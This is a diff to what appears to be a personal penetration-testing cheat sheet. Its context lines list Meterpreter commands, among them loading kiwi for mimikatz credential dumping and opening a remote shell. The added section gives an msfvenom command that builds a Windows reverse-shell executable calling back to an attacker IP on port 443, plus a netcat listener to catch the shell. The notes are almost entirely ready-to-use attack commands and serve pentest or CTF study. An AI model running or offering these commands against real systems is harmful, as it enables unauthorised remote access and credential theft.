@@ -12,3 +12,14 @@
 - `load kiwi` will in let us use mimikatz
 - `screenshot` Grab a screenshot of the interactive desktop
 - `shell`  get a shell on remote machine
+
+# MSFvenoim
+WINDOWS reverse shell
+- get ip `ip a`
+- `msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 -f exe > shell.exe`
+- `nc -lvnp 443`
+
+
+
+
+https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
